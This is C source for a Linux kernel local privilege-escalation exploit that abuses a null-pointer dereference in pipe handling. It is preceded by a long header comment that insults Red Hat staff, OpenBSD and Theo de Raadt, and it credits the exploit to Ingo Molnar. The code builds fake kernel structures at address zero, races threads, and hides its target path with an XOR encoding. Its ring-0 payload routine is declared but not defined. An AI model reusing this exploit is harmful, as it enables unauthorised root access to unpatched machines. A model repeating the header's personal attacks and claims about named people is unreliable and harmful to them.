/* exp_moosecox.c
   Watch a video of the exploit here:
   http://www.youtube.com/watch?v=jt81NvaOj5Y

   developed entirely by Ingo Molnar (exploit writer extraordinaire!) , 
   thanks to Fotis Loukos for pointing the bug out to me -- neat bug! :)

   dedicated to the Red Hat employees who get paid to copy+paste my 
   twitter and issue security advisories, their sweet 
   acknowledgement policy, and general classiness
   see: https://bugzilla.redhat.com/show_activity.cgi?id=530490

   "policy" aside, there's a word for what you guys are doing: "plagiarism"
   in fact, i tested this one day by posting three links to twitter,
   without any discussion on any of them.  the same day, those three
   (and only those three) links were assigned CVEs, even though two of 
   them weren't even security bugs (it doesn't pay to copy+paste)

   official Ingo Molnar (that's me) policy for acknowledgement in 
   exploits requires general douche-ness or plagiarization
   official policy further dictates immediate exploit release for
   embargoed, patched bug

   I'll be curious to see what the CVE statistics are like for the 
   kernel this year when they get compiled next year -- I'm predicting 
   that when someone's watching the sleepy watchers, a more personal 
   interest is taken in doing the job that you're paid to do correctly.

   --------------------------------------------------------------------

   Special PS note to Theo (I can do this here because I know he'll 
   never read it -- the guy is apparently oblivious to the entire world of 
   security around him -- the same world that invents the protections 
   years before him that he pats himself on the back for "innovating")
   Seriously though, it's incredible to me that an entire team 
   of developers whose sole purpose is to develop a secure operating 
   system can be so oblivious to the rest of the world.  They haven't 
   innovated since they replaced exploitable string copies with 
   exploitable string truncations 6 or so years ago.

   The entire joke of a thread can be read here:
   http://www.pubbs.net/openbsd/200911/4582/
   "Our focus therefore is always on finding innovative ideas which make 
   bugs very hard to exploit succesfully."
   "He's too busy watching monkey porn instead of
   building researching last-year's security technology that will stop 
   an exploit technique that has been exploited multiple times."
   "it seems that everyone else is slowly coming around to the
   same solution."

   So let's talk about this "innovation" of theirs with their 
   implementation of mmap_min_addr:

   They implemented it in 2008, a year after Linux implemented it, a 
   year after the public phrack article on the bug class, more than a 
   year after my mail to dailydave with the first public Linux kernel 
   exploit for the bug class, and over two years after UDEREF was 
   implemented in PaX (providing complete protection against the smaller 
   subset of null ptr dereference bugs and the larger class of invalid 
   userland access in general).

   OpenBSD had a public null pointer dereference exploit (agp_ioctl()) 
   published for its OS in January of 2007.  It took them over a year 
   and a half to implement the same feature that was implemented in 
   Linux a few months after my public exploit in 2007.

   So how can it be that "everyone else is slowly coming around to the 
   same solution"  when "everyone else" came to that solution over a 
   year before you Theo?  In fact, I prediced this exact situation would 
   happen back in 2007 in my DD post:
   http://lists.virus.org/dailydave-0703/msg00011.html
   "Expect OpenBSD to independently invent a protection against null ptr 
   deref bugs sometime in 2009."

   Let's talk about some more "innovation" -- position independent 
   executables.  PaX implemented position independent executables on 
   Linux back in 2001 (ET_DYN).  PIE binary support was added to GNU 
   binutils in 2003.  Those OpenBSD innovators implemented PIE binaries 
   in 2008, 7 years after PaX.  Innovation indeed!

   How about their W^X/ASLR innovation?  These plagiarists have the 
   audacity to announce on their press page:
   http://www.openbsd.org/press.html
   "Microsoft borrows one of OpenBSD's security features for Vista, 
   stack/library randomization, under the name Address Space Layout 
   Randomization (ASLR).  "Until now, the feature has been most 
   prominently used in the OpenBSD Unix variant and the PaX and Exec 
   Shield security patches for Linux""
   Borrowing one of your features?  Where'd this ASLR acronym come from 
   anyway?  Oh that's right, PaX again -- when they published the first 
   design and implementation of it, and coined the term, in July 2001.
   It covered the heap, mmap, and stack areas.
   OpenBSD implemented "stack-gap randomization" in 2003.  Way to 
   innovate!

   W^X, which is a horrible name as OpenBSD doesn't even enforce it with 
   mprotect restrictions like PaX did from the beginning or even SELinux 
   is doing now (from a 3rd party contribution modeled after PaX): 
   PaX implemented true per-page non-executable page support, protecting 
   binary data, the heap, and the stack, back in 2000.
   OpenBSD implemented it in 2003, requiring a full userland rebuild.
   The innovation is overwhelming!

   They keep coming up with the same exact "innovations" others came up 
   with years before them.  Their official explanation for where they 
   got the W^X/ASLR ideas was a drunk guy came into their tent at one of 
   their hack-a-thons and started talking about the idea.  They had 
   never heard of PaX when we asked them in 2003.  Which makes the 
   following involuntarily contributed private ICB logs from Phrack #66
   (Internet Citizen's Band -- OpenBSD internal chat network) so intriguing:

   On some sunny day in July 2002 (t: Theo de Raadt):
   <cloder> why can't you just randomize the base
   <cloder> that's what PaX does
   <t> You've not been paying attention to what art's saying, or you don't 
   understand yet, either case is one of think it through yourself.
   <cloder> whatever

   Only to see poetic justice in August 2003 (ttt: Theo again):

   <miod> more exactly, we heard of pax when they started bitching
   <ttt> miod, that was very well spoken.

   That wraps up our OpenBSD history lesson, in case anyone forgot it.
   PS -- enjoy that null ptr deref exploit just released for OpenBSD.

   --------------------------------------------------------------------

   Important final exploit notes:

   don't forget to inspect /boot/config* to see if PREEMPT, LOCKBREAK,
   or DEBUG_SPINLOCK are enabled and modify the structures below 
   accordingly -- a fancier exploit would do this automatically

   I've broken the 2.4->2.6.10 version of the exploit and would like to see 
   someone fix it ;)  See below for more comments on this.
*/

#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sched.h>
#include <signal.h>
#include <sys/syscall.h>

#ifndef CLONE_VM
#define CLONE_VM 0x00000100
#define CLONE_FS 0x00000200
#define CLONE_FILES 0x00000400
#define CLONE_SIGHAND 0x00000800
#endif

extern volatile int got_ring0;
int pipefd[2];

int go_go_speed_racer(void *unused)
{
	int ret;

  while(!got_ring0) {
		/* bust spinlock */
		*(unsigned int *)NULL = 1;
    ret = pipe(pipefd);
		if (!ret) {
      close(pipefd[0]);
      close(pipefd[1]);
		}
  }

	return 0;
}

/* <3 twiz/sgrakkyu */
int start_thread(int (*f)(void *), void *arg)
{
  char *stack = malloc(0x4000);
  int tid = __pthread_clone(f, stack + 0x4000 - sizeof(unsigned long), CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_VM, arg);
  if (tid < 0) {
    exit(1);
  }
	sleep(1);
  return tid;
}

#define PIPE_BUFFERS 16

/* this changes on older kernels, but it doesn't matter to our method */
struct pipe_buf_operations {
	int can_merge;
	void *map;
	void *unmap;
	void *confirm;
	void *release;
	void *steal;
	void *get;
};

struct pipe_buffer {
	void *page;
	unsigned int offset, len;
	void *ops;
	unsigned int flags;
	unsigned long private;
};

struct pipe_inode_info {
	/*
	unsigned int spinlock;
	// LOCKBREAK
	unsigned int break_lock;
	// DEBUG_SPINLOCK
	unsigned int magic, owner_cpu;
	void *owner;
	*/
	void *next, *prev;
	unsigned int nrbufs, curbuf;
	void *tmp_page;
	unsigned int readers;
	unsigned int writers;
	unsigned int waiting_writers;
	unsigned int r_counter;
	unsigned int w_counter;
	void *fasync_readers;
	void *fasync_writers;
	void *inode;
	struct pipe_buffer bufs[PIPE_BUFFERS];
};

struct fasync_struct {
	int magic;
	int fa_fd;
	struct fasync_struct *fa_next;
	void *file;
};

int get_ring0(struct pipe_inode_info *pipe, struct pipe_buffer *buf);

int prepare(unsigned char *buf)
{	
	struct pipe_inode_info *info = (struct pipe_inode_info *)buf;
	struct pipe_buf_operations *ops = (struct pipe_buf_operations *)0x800;
	int i;
	int newver;
  
	/* for most of these what will happen is our write will
	   cause ops->confirm(/pin) to be called, which we've replaced
	   with own_the_kernel
	   for the 2.6.10->2.6.16 case it has no confirm/pin op, so what gets
	   called instead (repeatedly) is the release op
	*/
  /* uncomment for DEBUG_SPINLOCK */
  //info->magic = 0xdead4ead;
  /* makes list_head empty for wake_up_common */
  info->next = &info->next;
  info->readers = 1;
  info->writers = 1;
  info->nrbufs = 1;
  info->curbuf = 1;
  for (i = 0; i < PIPE_BUFFERS; i++)
    info->bufs[i].ops = (void *)ops;
  
	ops->can_merge = 1;
	for (i = 0; i < 16; i++)
		((void **)&ops->map)[i] = get_ring0;

	return 0;
}

char __attribute__((section(".null"))) null[0x1000];

void decode(char *ptr, size_t size)
{
  size_t i;
  
  for (i = 0; i < size; i++) {
    ptr[i] ^= 0x65;
  }
}

int main(void)
{
  char enc_path[17] = {0x4A, 0x15, 0x17, 0x0A, 0x06, 0x4A, 0x16, 0x00, 0x09, 0x03, 0x4A, 0x03, 0x01, 0x4A, 0x40, 0x01, 0x65};
  char fmt[17];
  char buf[128];
  int fd;
  
  prepare(NULL);
  
	/* ignore sigpipe so we don't bail out early */
	signal(SIGPIPE, SIG_IGN);
  
	start_thread(go_go_speed_racer, NULL);
  
  puts("Start.");
  fflush(stdout);
  
  while (!got_ring0) {
		fd = pipefd[1];
    memcpy(fmt, enc_path, 17);
    decode(fmt, 17);
		sprintf(buf, fmt, fd);
		fd = open(buf, O_WRONLY | O_NONBLOCK);
		if (fd >= 0) {
			/* bust spinlock */
			*(unsigned int *)NULL = 1;
			write(fd, ".", 1);
			close(fd);
		}
  }
  
  puts("Finish. Enjoy!");
  
	return 0;
}
